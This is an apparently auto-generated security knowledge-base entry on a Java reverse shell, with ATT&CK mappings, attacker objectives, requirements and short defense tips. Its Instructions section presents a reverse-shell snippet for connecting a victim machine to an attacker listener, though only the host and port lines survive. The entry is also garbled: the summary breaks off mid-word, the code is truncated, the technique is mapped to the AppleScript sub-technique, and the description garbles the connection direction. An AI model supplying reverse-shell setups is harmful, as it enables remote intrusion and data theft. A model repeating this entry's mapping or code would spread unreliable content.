---
id: 75a4e7c0-3224-4c80-a2c8-81bc2d3ea191
name: Java Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.553567+00:00'
updated_at: '2023-04-10T20:25:32.021356+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
sub_techniques:
- '[[AppleScript|T1059.002 - AppleScript]]'
tags:
- '[[Java]]'
- '[[Java Alternative 1]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Java Reverse Shell

## Summary

Java Reverse Shell is a technique used by attackers to establish a command and control channel from a victim machine to an attacker-controlled machine. The attacker can use this channel to execute commands on the victim machine and exfiltrate data. The Java implementation of this technique is usefu

## Description

# Description

Java Reverse Shell is a technique used by attackers to establish a command and control channel from a victim machine to an attacker-controlled machine. The attacker can use this channel to execute commands on the victim machine and exfiltrate data. The Java implementation of this technique is useful in environments where other scripting languages may not be installed or may be blocked by security controls.

Technical Explanation: The attacker first establishes a listener on a machine that they control. They then use the Java Reverse Shell code to connect to the listener from the victim machine. Once the connection is established, the attacker can execute commands on the victim machine through the command and control channel.

Business Value: An attacker can use this technique to gain unauthorized access to sensitive data, steal intellectual property, or disrupt business operations.

## Requirements

1. The victim machine must have Java installed

1. The attacker must have network access to the victim machine

## Defense

1. Disable unnecessary services and ports on the victim machine

1. Use firewalls and intrusion detection/prevention systems to monitor network traffic

1. Implement strong authentication mechanisms to prevent unauthorized access to the victim machine

## Objectives

1. Establish a command and control channel from the victim machine to the attacker-controlled machine

1. Execute commands on the victim machine

1. Exfiltrate data from the victim machine

# Instructions

1. This command allows you to execute commands on a remote machine using Java. To use this command, you need to replace the IP address and port number with the IP address and port number of the remote machine. You also need to replace the cmd variable with the command that you want to execute on the remote machine.

**Code**: [[String host="127.0.0.1";
int port=4444;
String cmd]]

> The command creates a socket connection to the remote machine and sends the command to be executed. The output of the command is then sent back to the local machine. The command uses the Java ProcessBuilder class to execute the command on the remote machine and the Socket class to create a socket connection to the remote machine. The InputStream and OutputStream classes are used to send and receive data over the socket connection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

### Sub-Techniques

- [[AppleScript|T1059.002 - AppleScript]]

## Tags

- [[Java]]
- [[Java Alternative 1]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
